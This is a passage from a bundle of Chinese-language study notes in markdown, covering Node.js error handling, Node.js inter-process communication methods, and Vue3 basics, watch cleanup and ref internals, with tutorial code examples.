}\n}\n```\n\n## 3. 全局未捕获异常处理：`process.on('uncaughtException', (error) => {}`\n\n```javascript hl:2,17,16\n// 未捕获的异常处理\nprocess.on('uncaughtException', (error) => {\n    console.error('未捕获的异常:', {\n        error: error,\n        time: new Date().toISOString(),\n        pid: process.pid\n    });\n    \n    // 记录错误日志\n    logError(error);\n    \n    // 优雅退出（建议在处理完关键操作后退出）\n    process.exit(1);\n});\n\n// 未处理的 Promise 拒绝\nprocess.on('unhandledRejection', (reason, promise) => {\n    console.error('未处理的 Promise 拒绝:', {\n        reason: reason,\n        time: new Date().toISOString(),\n        pid: process.pid\n    });\n    \n    // 记录错误日志\n    logError(reason);\n});\n\n// 自定义错误日志记录函数\nfunction logError(error) {\n    // 这里可以实现错误日志记录逻辑\n    // 比如写入文件或发送到日志服务\n}\n```\n\n## 4. Express 错误处理中间件\n\n```javascript\nconst express = require('express');\nconst app = express();\n\n// 自定义错误类\nclass AppError extends Error {\n    constructor(statusCode, message) {\n        super(message);\n        this.statusCode = statusCode;\n        this.status = `${statusCode}`.startsWith('4') ? 'fail' : 'error';\n        this.isOperational = true;\n\n        Error.captureStackTrace(this, this.constructor);\n    }\n}\n\n// 异步函数错误捕获包装器\nconst catchAsync = fn => {\n    return (req, res, next) => {\n        fn(req, res, next).catch(next);\n    };\n};\n\n// 路由处理\napp.get('/api/data', catchAsync(async (req, res) => {\n    const data = await fetchData();\n    if (!data) {\n        throw new AppError(404, '数据不存在');\n    }\n    res.json(data);\n}));\n\n// 404 错误处理\napp.use((req, res, next) => {\n    next(new AppError(404, '找不到请求的资源'));\n});\n\n// 全局错误处理中间件\napp.use((error, req, res, next) => {\n    error.statusCode = error.statusCode || 500;\n    error.status = error.status || 'error';\n\n    // 开发环境错误响应\n    if (process.env.NODE_ENV === 'development') {\n        res.status(error.statusCode).json({\n            status: error.status,\n            error: error,\n            message: error.message,\n            stack: error.stack\n        });\n    } \n    // 生产环境错误响应\n    else {\n        // 操作型错误：发送给客户端\n        if (error.isOperational) {\n            res.status(error.statusCode).json({\n                status: error.status,\n                message: error.message\n            });\n        } \n        // 程序型错误：不暴露详细信息\n        else {\n            console.error('ERROR 💥', error);\n            res.status(500).json({\n                status: 'error',\n                message: '服务器内部错误'\n            });\n        }\n    }\n});\n```\n\n## 5. 数据库操作错误处理\n\n```javascript\nconst mongoose = require('mongoose');\n\n// MongoDB 连接错误处理\nmongoose.connect('mongodb://localhost/myapp', {\n    useNewUrlParser: true,\n    useUnifiedTopology: true\n})\n.then(() => console.log('数据库连接成功'))\n.catch(error => {\n    console.error('数据库连接失败:', error);\n    process.exit(1);\n});\n\n// 数据库操作错误处理\nasync function databaseOperation() {\n    const session = await mongoose.startSession();\n    try {\n        session.startTransaction();\n\n        // 执行数据库操作\n        await Model.create([{ data: 'example' }], { session });\n\n        await session.commitTransaction();\n    } catch (error) {\n        await session.abortTransaction();\n        throw error;\n    } finally {\n        session.endSession();\n    }\n}\n```\n\n## 6. 事件触发器错误处理 →   `events`\n\n```javascript hl:21\nconst EventEmitter = require('events');\n\nclass MyEmitter extends EventEmitter {\n    execute() {\n        try {\n            this.emit('start');\n            // 某些操作\n            if (error) {\n                this.emit('error', new Error('操作失败'));\n            }\n            this.emit('end');\n        } catch (error) {\n            this.emit('error', error);\n        }\n    }\n}\n\nconst myEmitter = new MyEmitter();\n\n// 错误事件监听\nmyEmitter.on('error', (error) => {\n    console.error('事件错误:', error);\n});\n\n// 其他事件监听\nmyEmitter.on('start', () => console.log('开始执行'));\nmyEmitter.on('end', () => console.log('执行完成'));\n```\n\n## 7. 定时器错误处理\n\n```javascript hl:1,10\nclass SafeInterval {\n    constructor(callback, interval) {\n        this.callback = callback;\n        this.interval = interval;\n        this.timer = null;\n    }\n\n    start() {\n        this.timer = setInterval(() => {\n            try {\n                this.callback();\n            } catch (error) {\n                console.error('定时器执行错误:', error);\n                this.stop(); // 发生错误时停止定时器\n            }\n        }, this.interval);\n    }\n\n    stop() {\n        if (this.timer) {\n            clearInterval(this.timer);\n            this.timer = null;\n        }\n    }\n}\n\n// 使用示例\nconst safeTimer = new SafeInterval(() => {\n    // 定时执行的操作\n}, 1000);\n\nsafeTimer.start();\n```\n\n## 8. 错误监控和报警\n\n```javascript hl:31,38\nclass ErrorMonitor {\n    constructor() {\n        this.errors = new Map();\n        this.threshold = 10; // 错误阈值\n        this.timeWindow = 60000; // 时间窗口（1分钟）\n    }\n\n    recordError(error) {\n        const errorKey = error.message;\n        const now = Date.now();\n        \n        if (!this.errors.has(errorKey)) {\n            this.errors.set(errorKey, []);\n        }\n        \n        const errorList = this.errors.get(errorKey);\n        errorList.push(now);\n        \n        // 清理超出时间窗口的错误记录\n        const validErrors = errorList.filter(time => \n            now - time < this.timeWindow\n        );\n        this.errors.set(errorKey, validErrors);\n\n        // 检查是否需要报警\n        if (validErrors.length >= this.threshold) {\n            this.sendAlert(error, validErrors.length);\n        }\n    }\n\n    sendAlert(error, count) {\n        console.error(`警告: 错误 \"${error.message}\" 在最近1分钟内出现了 ${count} 次`);\n        // 这里可以添加发送邮件或其他通知的逻辑\n    }\n}\n\n// 使用示例\nconst errorMonitor = new ErrorMonitor();\nprocess.on('uncaughtException', error => {\n    errorMonitor.recordError(error);\n});\n```\n\n## 9. 写一个koa中间件，用于捕获相关的异常\n\n![图片&文件](./files/20241027-8.png)\n\n## 10. 总结\n\n1. 合理区分开发环境和生产环境的错误处理\n2. 确保错误被正确记录和监控\n3. 实现优雅的错误恢复机制\n4. 避免敏感信息泄露\n5. 保持应用的稳定性\n\n","C57bjmjC":"\n# Node.js 中的通信方式都有哪些\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- child_process：\n\t- 适用于`父子进程`通信\n- cluster：\n\t- 适用于`主从架构的多进程应用`\n- Socket：\n\t- 适用于`跨机器`的进程通信 \n- 消息队列：\n\t- 适用于解耦的异步通信 （redis）\n- 共享==内存==：\n\t- 适用于高性能数据共享（`worker_threads`）\n- HTTP / HTTPS：\n\t- 适用于 `RESTful` 服务通信\n- WebSocket：\n\t- 适用于实时==双向通信==\n- 进程管理：\n\t- 适用于复杂的多进程应用\n\n> 下面展开聊\n\n## 2. child_process 子进程通信\n\n- `spawn` 方式\n- `fork` 方式\n\n```javascript hl:1,19\n// 1.1 spawn 方式\nconst { spawn } = require('child_process');\n\n// 父进程\nconst child = spawn('node', ['child.js']);\n\nchild.stdout.on('data', (data) => {\n    console.log('子进程输出：', data.toString());\n});\n\nchild.stderr.on('data', (data) => {\n    console.error('子进程错误：', data.toString());\n});\n\nchild.on('close', (code) => {\n    console.log(`子进程退出，退出码 ${code}`);\n});\n\n// 1.2 fork 方式\nconst { fork } = require('child_process');\n\n// 父进程 (parent.js)\nconst child = fork('./child.js');\n\n// 发送消息给子进程\nchild.send({ hello: 'world' });\n\n// 接收子进程消息\nchild.on('message', (message) => {\n    console.log('收到子进程消息:', message);\n});\n\n// 子进程 (child.js)\nprocess.on('message', (message) => {\n    console.log('收到父进程消息:', message);\n    // 回复父进程\n    process.send({ received: true });\n});\n```\n\n## 3. cluster ==集群模式==通信\n\n```javascript hl:34,39\nconst cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n    // 主进程代码\n    console.log(`主进程 ${process.pid} 正在运行`);\n\n    // 生成工作进程\n    for (let i = 0; i < numCPUs; i++) {\n        const worker = cluster.fork();\n\n        // 主进程发送消息给工作进程\n        worker.send({ type: 'hello', from: 'master' });\n\n        // 接收工作进程消息\n        worker.on('message', (message) => {\n            console.log(`主进程收到来自工作进程 ${worker.id} 的消息:`, message);\n        });\n    }\n\n    // 监听工作进程退出\n    cluster.on('exit', (worker, code, signal) => {\n        console.log(`工作进程 ${worker.process.pid} 已退出`);\n    });\n} else {\n    // 工作进程代码\n    http.createServer((req, res) => {\n        res.writeHead(200);\n        res.end('你好，世界\\n');\n    }).listen(8000);\n\n    // 工作进程接收消息\n    process.on('message', (message) => {\n        console.log(`工作进程 ${process.pid} 收到消息:`, message);\n    });\n\n    // 工作进程发送消息给主进程\n    process.send({ type: 'ready', pid: process.pid });\n}\n```\n\n## 4. Socket 通信\n\n```javascript\n// 3.1 TCP Socket\nconst net = require('net');\n\n// TCP 服务器\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        console.log('收到数据:', data.toString());\n        socket.write('服务器已收到消息');\n    });\n});\n\nserver.listen(8080, () => {\n    console.log('TCP 服务器启动在端口 8080');\n});\n\n// TCP 客户端\nconst client = new net.Socket();\nclient.connect(8080, 'localhost', () => {\n    client.write('你好，服务器');\n});\n\n// 3.2 Unix Domain Socket\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        console.log('收到数据:', data.toString());\n    });\n});\n\nserver.listen('/tmp/node.sock');\n```\n\n## 5. 消息队列（使用 Redis）\n\n```javascript\nconst Redis = require('ioredis');\nconst redis = new Redis();\n\n// 发布者\nclass Publisher {\n    constructor() {\n        this.redis = new Redis();\n    }\n\n    publish(channel, message) {\n        return this.redis.publish(channel, JSON.stringify(message));\n    }\n}\n\n// 订阅者\nclass Subscriber {\n    constructor() {\n        this.redis = new Redis();\n    }\n\n    subscribe(channel, callback) {\n        this.redis.subscribe(channel, (err, count) => {\n            if (err) {\n                console.error('订阅错误:', err);\n                return;\n            }\n            console.log(`订阅了 ${count} 个频道`);\n        });\n\n        this.redis.on('message', (channel, message) => {\n            callback(channel, JSON.parse(message));\n        });\n    }\n}\n\n// 使用示例\nconst publisher = new Publisher();\nconst subscriber = new Subscriber();\n\nsubscriber.subscribe('news', (channel, message) => {\n    console.log(`收到来自 ${channel} 的消息:`, message);\n});\n\npublisher.publish('news', { title: '重要通知', content: '系统更新' });\n```\n\n## 6. 共享内存（使用 Node.js worker_threads）\n\n```javascript\nconst { Worker, isMainThread, parentPort, workerData, SharedArrayBuffer } = require('worker_threads');\n\nif (isMainThread) {\n    // 主线程代码\n    const sharedBuffer = new SharedArrayBuffer(1024);\n    const sharedArray = new Int32Array(sharedBuffer);\n\n    const worker = new Worker(__filename, {\n        workerData: { sharedBuffer }\n    });\n\n    worker.on('message', (message) => {\n        console.log('主线程收到消息:', message);\n        console.log('共享内存数据:', sharedArray[0]);\n    });\n\n    // 修改共享内存\n    sharedArray[0] = 100;\n    worker.postMessage('已更新共享内存');\n} else {\n    // 工作线程代码\n    const sharedArray = new Int32Array(workerData.sharedBuffer);\n\n    parentPort.on('message', (message) => {\n        console.log('工作线程收到消息:', message);\n        console.log('共享内存数据:', sharedArray[0]);\n        \n        // 修改共享内存\n        sharedArray[0] += 1;\n        parentPort.postMessage('工作线程已修改共享内存');\n    });\n}\n```\n\n## 7. HTTP/HTTPS 通信\n\n```javascript\nconst http = require('http');\nconst axios = require('axios');\n\n// HTTP 服务器\nconst server = http.createServer((req, res) => {\n    if (req.method === 'POST') {\n        let body = '';\n        req.on('data', chunk => {\n            body += chunk.toString();\n        });\n        req.on('end', () => {\n            console.log('收到数据:', JSON.parse(body));\n            res.writeHead(200, { 'Content-Type': 'application/json' });\n            res.end(JSON.stringify({ status: 'ok' }));\n        });\n    }\n});\n\nserver.listen(3000, () => {\n    console.log('HTTP 服务器运行在端口 3000');\n});\n\n// HTTP 客户端\nasync function sendRequest() {\n    try {\n        const response = await axios.post('http://localhost:3000', {\n            message: '你好，服务器'\n        });\n        console.log('服务器响应:', response.data);\n    } catch (error) {\n        console.error('请求错误:', error);\n    }\n}\n```\n\n## 8. WebSocket 通信\n\n```javascript\nconst WebSocket = require('ws');\n\n// WebSocket 服务器\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws) => {\n    console.log('新的连接建立');\n\n    ws.on('message', (message) => {\n        console.log('收到消息:', message.toString());\n        // 广播消息给所有客户端\n        wss.clients.forEach((client) => {\n            if (client !== ws && client.readyState === WebSocket.OPEN) {\n                client.send(message.toString());\n            }\n        });\n    });\n});\n\n// WebSocket 客户端\nconst ws = new WebSocket('ws://localhost:8080');\n\nws.on('open', () => {\n    ws.send('客户端连接成功');\n});\n\nws.on('message', (data) => {\n    console.log('收到服务器消息:', data.toString());\n});\n```\n\n## 9. 进程管理和监控\n\n```javascript\nclass ProcessManager {\n    constructor() {\n        this.workers = new Map();\n        this.setupMaster();\n    }\n\n    setupMaster() {\n        cluster.setupMaster({\n            exec: 'worker.js',\n            args: ['--use', 'http']\n        });\n\n        cluster.on('online', (worker) => {\n            console.log(`工作进程 ${worker.process.pid} 已启动`);\n            this.workers.set(worker.id, worker);\n        });\n\n        cluster.on('exit', (worker, code, signal) => {\n            console.log(`工作进程 ${worker.process.pid} 退出`);\n            this.workers.delete(worker.id);\n            \n            // 自动重启进程\n            if (signal !== 'SIGTERM') {\n                this.createWorker();\n            }\n        });\n    }\n\n    createWorker() {\n        const worker = cluster.fork();\n        return worker;\n    }\n\n    broadcastMessage(message) {\n        for (const worker of this.workers.values()) {\n            worker.send(message);\n        }\n    }\n\n    shutdown() {\n        for (const worker of this.workers.values()) {\n            worker.kill('SIGTERM');\n        }\n    }\n}\n\n// 使用示例\nconst manager = new ProcessManager();\n// 创建工作进程\nfor (let i = 0; i < require('os').cpus().length; i++) {\n    manager.createWorker();\n}\n\n// 广播消息\nmanager.broadcastMessage({ type: 'config', data: { port: 8000 } });\n```\n\n","EpQ2sCB5":"\n# 前言\n\n\n> Vue3 基础、原理、源码等\n\n","sYrKZCZS":"\n# Vue3 基础：篇一\n\n`#vue3` `#前端` `#R1` \n\n\n## 目录\n<!-- toc -->\n ## 1. Vue 简介 \n\n- Vue 是一个用于构建用户界面的 JavaScript 框架，提供了`声明式渲染`和`响应式更新`等核心功能\n- Vue 是一个`渐进式框架`，可以根据需求灵活地选择使用方式，适用于简单到复杂的各种 Web 开发场景\n\t- 比如 HTML → Web Components → SPA → SSR → **SSG** →   桌面端、移动端、WebGL 等\n\n## 2. 单文件组件 SFC\n\n即 Vue 的单文件组件会将一个组件的逻辑 (JavaScript)，模板 (HTML) 和样式 (CSS) 封装在同一个文件里，如下示例：\n\n```vue\n<template>\n  <button @click=\"count++\">Count is: {{ count }}</button>\n</template>\n\n<script setup>\n  import { ref } from 'vue'\n  const count = ref(0)\n</script>\n\n<style scoped>\n  button {\n  font-weight: bold;\n  }\n</style>\n```\n\n## 3. 组合式 API (Composition API) vs 选项式 API (Options API)\n\nVue 有两种主要的 API 风格：`选项式 API` 和`组合式 API`，开发者可以根据喜好和项目需求选择使用。\n\n### 3.1. 选项式 \n\n```vue\n<script>\nexport default {\n  // data() 返回的属性将会成为响应式的状态\n  // 并且暴露在 `this` 上\n  data() {\n    return {\n      count: 0\n    }\n  },\n\n  // methods 是一些用来更改状态与触发更新的函数\n  // 它们可以在模板中作为事件处理器绑定\n  methods: {\n    increment() {\n      this.count++\n    }\n  },\n\n  // 生命周期钩子会在组件生命周期的各个不同阶段被调用\n  // 例如这个函数就会在组件挂载完成后被调用\n  mounted() {\n    console.log(`The initial count is ${this.count}.`)\n  }\n}\n</script>\n\n<template>\n  <button @click=\"increment\">Count is: {{ count }}</button>\n</template>\n```\n\n#### 为什么使用函数返回对象？ → 保证每个组件都用独立的对象\n\n> 否则多个组件会共享数据了，因为引用类型的原因\n\n![图片&文件](./files/20241127-6.png)\n\n### 3.2. 组合式 + setup\n\n```vue\n<script setup>\nimport { ref, onMounted } from 'vue'\n\n// 响应式状态\nconst count = ref(0)\n\n// 用来修改状态、触发更新的函数\nfunction increment() {\n  count.value++\n}\n\n// 生命周期钩子\nonMounted(() => {\n  console.log(`The initial count is ${count.value}.`)\n})\n</script>\n\n<template>\n  <button @click=\"increment\">Count is: {{ count }}</button>\n</template>\n```\n\n> 我们要求使用 `组合式 API (Composition API)` + `<script setup>`\n\n## 4. 使用 Vue3 的几种方式\n\n### 4.1. npm 包引入\n\n```js\nimport { createApp } from 'vue'\n\nconst app = createApp({\n  /* 根组件选项 */\n})\n```\n\n### 4.2. 通过 CDN 使用 Vue\n\n```html\n<script src=\"https://unpkg.com/vue@3/dist/vue.global.js\"></script>\n<div id=\"app\">{{ message }}</div>\n\n<script>\n  const { createApp, ref } = Vue\n\n  createApp({\n    setup() {\n      const message = ref('Hello vue!')\n      return {\n        message\n      }\n    }\n  }).mount('#app')\n</script>\n```\n\n### 4.3. 使用 ES 模块构建版本\n\n> 注意是 `<script type=\"module\">`\n\n```html\n<div id=\"app\">{{ message }}</div>\n\n<script type=\"module\">\nimport { createApp, ref } from 'https://unpkg.com/vue@3/dist/vue.esm-browser.js'\n\n  createApp({\n    setup() {\n      const message = ref('Hello Vue!')\n      return {\n        message\n      }\n    }\n  }).mount('#app')\n</script>\n```\n\n### 4.4. Import maps 方式引用  →  `<script type=\"importmap\">`\n\n```vue hl:2\n<!-- 这个标签包含一个 JSON 对象，用于定义模块的映射关系。 -->\n<script type=\"importmap\">\n  {\n    \"imports\": {\n      \"vue\": \"https://unpkg.com/vue@3/dist/vue.esm-browser.js\"\n    }\n  }\n</script>\n\n<div id=\"app\">{{ message }}</div>\n\n<script type=\"module\">\n  import { createApp, ref } from 'vue'\n\n  createApp({\n    setup() {\n      const message = ref('Hello Vue!')\n      return {\n        message\n      }\n    }\n  }).mount('#app')\n</script>\n```\n\n> 注意 `<script type=\"importmap\">` 的兼容性\n\n","WIAVz2p1":"\n# vue3 watch 的详细用法（取消监听、恢复监听及清理副作用等）\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 清理时机\n\t- 在侦听器**下一次执行前**清理上一次的副作用\n\t- 在**组件卸载时**清理副作用\n- 注意这==三个参数==：\n\t- newVal, oldVal,\n\t- onCleanup\n\t\t- 接受一个函数，作为==清理函数==\n\t\t- 具体==使用示例==见下面\n- v3.5支持暂停和恢复侦听器：\n\t- `const { stop, pause, resume } = watchEffect(() => {})`\n- 手动停止侦听器\n\t- `const stop = watch(count, (newValue, oldValue) => {`\n\n\n> 记得那会看 Vue 源码时，只看到为了 watch 的竞态问题，当时没太理解，再看时，才真正的理解，所以**重复是很重要的**\n\n## 2. 基本语法定义\n\n```typescript hl:18\n// 侦听单个来源\nfunction watch<T>(\n  source: WatchSource<T>,\n  callback: WatchCallback<T>,\n  options?: WatchOptions\n): WatchHandle\n\n// 侦听多个来源\nfunction watch<T>(\n  sources: WatchSource<T>[],\n  callback: WatchCallback<T[]>,\n  options?: WatchOptions\n): WatchHandle\n\ntype WatchCallback<T> = (\n  value: T,\n  oldValue: T,\n  onCleanup: (cleanupFn: () => void) => void\n) => void\n\ntype WatchSource<T> =\n  | Ref<T> // ref\n  | (() => T) // getter\n  | T extends object\n  ? T\n  : never // 响应式对象\n\ninterface WatchOptions extends WatchEffectOptions {\n  immediate?: boolean // 默认：false\n  deep?: boolean | number // 默认：false\n  flush?: 'pre' | 'post' | 'sync' // 默认：'pre'\n  onTrack?: (event: DebuggerEvent) => void\n  onTrigger?: (event: DebuggerEvent) => void\n  once?: boolean // 默认：false (3.4+)\n}\n\ninterface WatchHandle {\n  (): void // 可调用，与 `stop` 相同\n  pause: () => void\n  resume: () => void\n  stop: () => void\n}\n```\n\n## 3. 基本使用示例：取消监听\n\n```javascript hl:23\nimport { ref, watch } from 'vue'\n\n// 监听单个响应式引用\nconst count = ref(0)\nconst stop = watch(count, (newValue, oldValue) => {\n  console.log('count changed:', newValue, oldValue)\n})\n\n// 监听多个数据源\nconst name = ref('John')\nconst age = ref(25)\nwatch(\n  [name, age],\n  ([newName, newAge], [oldName, oldAge]) => {\n    console.log('Person changed:', {\n      name: [oldName, newName],\n      age: [oldAge, newAge]\n    })\n  }\n)\n\n// 取消监听\nstop() // 调用返回的函数即可取消监听\n```\n\n## 4. 监听选项的使用\n\n```javascript hl:9,12,29\nconst count = ref(0)\n\n// immediate: 立即执行\nwatch(\n  count,\n  (newVal, oldVal) => {\n    console.log('Count:', newVal, oldVal)\n  },\n  { immediate: true }\n)\n\n// deep: 深度监听\nconst user = reactive({\n  profile: {\n    name: 'John',\n    settings: {\n      theme: 'dark'\n    }\n  }\n})\n\n\n// flush: 控制回调的触发时机\nwatch(\n  count,\n  () => {\n    console.log('DOM updated')\n  },\n  { flush: 'post' } // 在 DOM 更新后触发\n)\n```\n\n## 5. 清理时机\n\n1. 在侦听器**下一次执行前**清理上一次的副作用\n2. 在**组件卸载时**清理副作用\n\n## 6. 清理副作用示例\n\n### 6.1. 示例：取消请求防止竞态\n\n```javascript hl:21,9\n<script setup>\nimport { ref, watchEffect } from 'vue'\n\nconst searchQuery = ref('')\nconst results = ref([])\n\nwatchEffect((onCleanup) => {\n  // 创建一个 abort controller\n  const controller = new AbortController()\n  const { signal } = controller\n\n  // 发起搜索请求\n  fetch(`/api/search?q=${searchQuery.value}`, { signal })\n    .then(res => res.json())\n    .then(data => {\n      results.value = data\n    })\n\n  // 在下一次执行前或组件卸载时中止上一次的请求\n  onCleanup(() => {\n    controller.abort()\n  })\n})\n</script>\n\n```\n\n### 6.2. 示例：防止重复请求\n\n```vue hl:20\n<template>\n  <div>\n    <input v-model=\"searchQuery\" placeholder=\"搜索...\">\n    <div>结果: {{ searchResult }}</div>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\nconst searchQuery = ref('')\nconst searchResult = ref('')\n\nwatch(searchQuery, async (newQuery, oldQuery, onCleanup) => {\n  // 用于存储当前请求是否应该被取消\n  let cancelled = false\n  \n  // 注册清理函数\n  onCleanup(() => {\n    cancelled = true\n  })\n\n  try {\n    // 模拟 API 请求\n    const result = await mockSearch(newQuery)\n    \n    // 如果在等待期间触发了新的搜索，就不更新结果\n    if (!cancelled) {\n      searchResult.value = result\n    }\n  } catch (error) {\n    if (!cancelled) {\n      console.error('搜索失败:', error)\n    }\n  }\n})\n\n// 模拟搜索 API\nfunction mockSearch(query) {\n  return new Promise((resolve) => {\n    setTimeout(() => {\n      resolve(`搜索 \"${query}\" 的结果`)\n    }, 1000)\n  })\n}\n</script>\n```\n\n### 6.3. 示例：定时器清理示例\n\n```vue hl:24\n<template>\n  <div>\n    <div>当前计数: {{ count }}</div>\n    <button @click=\"isRunning = !isRunning\">\n      {{ isRunning ? '停止' : '开始' }}\n    </button>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\nconst count = ref(0)\nconst isRunning = ref(false)\n\nwatch(isRunning, (newValue, oldValue, onCleanup) => {\n  if (newValue) {\n    // 启动定时器\n    const timer = setInterval(() => {\n      count.value++\n    }, 1000)\n\n    // 注册清理函数\n    onCleanup(() => {\n      clearInterval(timer)\n    })\n  }\n})\n</script>\n```\n\n### 6.4. 示例：处理多个异步请求示例\n\n```vue hl:25\n<template>\n  <div>\n    <select v-model=\"selectedId\">\n      <option value=\"1\">用户 1</option>\n      <option value=\"2\">用户 2</option>\n      <option value=\"3\">用户 3</option>\n    </select>\n    <div>用户信息: {{ userInfo }}</div>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\nconst selectedId = ref('1')\nconst userInfo = ref(null)\n\nwatch(selectedId, async (newId, oldId, onCleanup) => {\n  let cancelled = false\n  \n  // 显示加载状态\n  userInfo.value = '加载中...'\n  \n  onCleanup(() => {\n    cancelled = true\n  })\n\n  try {\n    // 模拟获取用户信息\n    const info = await fetchUserInfo(newId)\n    if (!cancelled) {\n      userInfo.value = info\n    }\n  } catch (error) {\n    if (!cancelled) {\n      userInfo.value = '加载失败'\n    }\n  }\n})\n\nfunction fetchUserInfo(id) {\n  return new Promise((resolve) => {\n    setTimeout(() => {\n      resolve(`用户 ${id} 的详细信息`)\n    }, 1000)\n  })\n}\n</script>\n```\n\n### 6.5. 示例：处理WebSocket连接示例，比如关闭 ws\n\n```vue hl:28,29\n<template>\n  <div>\n    <div>连接状态: {{ isConnected ? '已连接' : '未连接' }}</div>\n    <button @click=\"isConnected = !isConnected\">\n      {{ isConnected ? '断开连接' : '建立连接' }}\n    </button>\n    <div>消息: {{ messages }}</div>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\nconst isConnected = ref(false)\nconst messages = ref([])\n\nwatch(isConnected, (shouldConnect, oldValue, onCleanup) => {\n  if (shouldConnect) {\n    // 模拟 WebSocket 连接\n    const ws = new MockWebSocket()\n    \n    ws.onmessage = (message) => {\n      messages.value.push(message)\n    }\n\n    // 清理函数\n    onCleanup(() => {\n      ws.close()\n      messages.value = []\n    })\n  }\n})\n\n// 模拟 WebSocket 类\nclass MockWebSocket {\n  constructor() {\n    this.timer = setInterval(() => {\n      if (this.onmessage) {\n        this.onmessage(`消息 ${Date.now()}`)\n      }\n    }, 1000)\n  }\n\n  close() {\n    clearInterval(this.timer)\n  }\n}\n</script>\n```\n\n### 6.6. 示例：防抖搜索示例\n\n和 React 自定义防抖函数 Hooks 一样，没必要一定要使用 `loadsh` 的防抖函数，因为清理函数会在特定时机执行，我们只需要在特定时机做特殊处理即可\n- 特定事件\n\t- 组件销毁时\n\t- watch 重新执行之前，开始下个 watch 时\n\n```vue hl:27\n<template>\n  <div>\n    <input v-model=\"searchQuery\" placeholder=\"输入搜索内容\">\n    <div>搜索建议: {{ suggestions }}</div>\n  </div>\n</template>\n\n<script setup>\nimport { ref, watch } from 'vue'\n\nconst searchQuery = ref('')\nconst suggestions = ref([])\n\nwatch(searchQuery, (newQuery, oldQuery, onCleanup) => {\n  // 设置延时标识\n  const timeoutId = setTimeout(async () => {\n    try {\n      const result = await fetchSuggestions(newQuery)\n      suggestions.value = result\n    } catch (error) {\n      console.error('获取建议失败:', error)\n    }\n  }, 300)\n\n  // 清理未执行的延时操作\n  onCleanup(() => {\n    clearTimeout(timeoutId)\n  })\n})\n\nfunction fetchSuggestions(query) {\n  return new Promise((resolve) => {\n    setTimeout(() => {\n      resolve([\n        `建议 1 for ${query}`,\n        `建议 2 for ${query}`,\n        `建议 3 for ${query}`\n      ])\n    }, 500)\n  })\n}\n</script>\n```\n\n## 7. 总结：`onCleanup` 的主要作用是\n\n- **防止竞态条件**：\n\t- 当多个异步操作同时进行时，确保只有最新的操作结果会被使用。\n- **资源清理**：\n\t- 清理定时器\n\t- 关闭网络连接\n\t- 取消未完成的请求\n\t- 重置状态\n- **性能优化**：\n\t- 防止不必要的操作和内存泄漏\n\n### 7.1. 使用建议\n\n1. 在处理异步操作时，始终考虑使用 `onCleanup`\n2. 在清理函数中要清理所有相关的副作用\n3. 确保**清理函数是同步的**\n4. 使用**标志变量**来控制异步操作的结果是否应该被使用\n\n## 8. 暂停/恢复侦听器： `v3.5`\n\n```js\nconst { stop, pause, resume } = watchEffect(() => {})\n\n// 暂停侦听器\npause()\n\n// 稍后恢复\nresume()\n\n// 停止\nstop()\n```\n\n## 9. 最佳实践和注意事项\n\n```javascript hl:1,8,15,27\n// 1. 避免在监听回调中直接修改被监听的值\nconst count = ref(0)\n// ❌ 错误示例\nwatch(count, (newVal) => {\n  count.value++ // 可能导致无限循环\n})\n\n// 2. 使用 watchEffect 替代简单的 watch\nimport { watchEffect } from 'vue'\n// ✅ 更简洁的写法\nwatchEffect(() => {\n  console.log('Count is:', count.value)\n})\n\n// 3. 合理使用 deep 选项\nconst user = reactive({\n  profile: { /* 深层对象 */ }\n})\n// 只监听需要的属性\nwatch(\n  () => user.profile.name,\n  (newVal) => {\n    console.log('Name changed:', newVal)\n  }\n)\n\n// 4. 及时清理不需要的监听器\nconst stop = watch(/* ... */)\nonUnmounted(() => {\n  stop()\n})\n```\n\n\n","SCr7RAoq":"\n# Vue3 中原始值的响应方案\n\n`#vue3` `#R1` \n\n\n>  本文讲原始值的响应方案，比如 `Boolean String BigInt Symbol undefined null Number`\n\n> 注意：这也是，平时我建议尽量使用 ref 而不使用 reactive 的原因\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- ref 的原理 → 依赖于 `reactive`\n\t- 本质上 `ref` 是一个 包裹 对象。\n\t\t- `因为` JavaScript 的 Proxy 无法提供对原始值的代理，`所以`我们需要使用一层对象作为包裹，`间接`实现原始值的响应式方案。\n\t- 如何判断是 ref 对象 →   `__v_isRef`\n\t\t- 由于“包 裹对象”本质上与普通对象没有任何区别，因此为了区分 ref 与普通响应式对象，\n\t\t\t- 我们还为“包裹对象”定义了一个值为 true 的属性，即 `__v_isRef`，用它作为 ref 的标识。\n- 响应式丢失问题\n\t- `ref` 除了能够用于原始值的响应式方案之外，还能用来解决`响应丢失问题`。\n\t- 为了解决该问题，我们实现了 `toRef` 以及 `toRefs` 这两个函数。\n\t\t- 它们本质上是对响应式数据做了一层包装，或者叫作`访问代理`\n- 自动脱 ref 的能力\n\t- 关键点\n\t\t- `get` 读取时，直接返回 `xxx.value`\n\t\t- `set` 时，设置 `xxx.value = newVal`\n\t- 模板中的响应式数据进行`脱 ref 处理`\n\t- 表现为 vue 模板中不需要输入 `.value`\n- ref 和 reactive 的区别\n\t- reactive 必须传入对象，ref 任意类型都行\n\t- 是否是复杂结构？复杂结构使用  `reactive`\n\t\t- 比如复杂表单，这样使用不用每次都 `.value` 了\n\t- reactive 性能一般，因为可能会导致连锁反映\n\n## 2. Ref 的原理\n\n原始值`按值传递`，所以需要`包裹` , 我们使用 `ref()` 来包裹。代码如下：\n\n```javascript hl:9\nfunction ref(val) {\n    const wrapper = {\n        value: val\n    }\n    // 定义一个不可枚举不可写的属性，用于标识他是一个 ref\n    Object.defineProperty(wrapper, '__v_isRef', {\n        value: true\n    })\n    return reactive(wrapper)\n}\n\n```\n\n> `ref` 依赖 `reactive` ，**是的就一段代码就完事了**\n\n## 3. 响应式丢失问题\n\n`ref` 还能解决`响应式丢失`的问题，关于`响应式丢失`，我们来看一个例子\n\n```javascript hl:4,11\n\nconst obj = 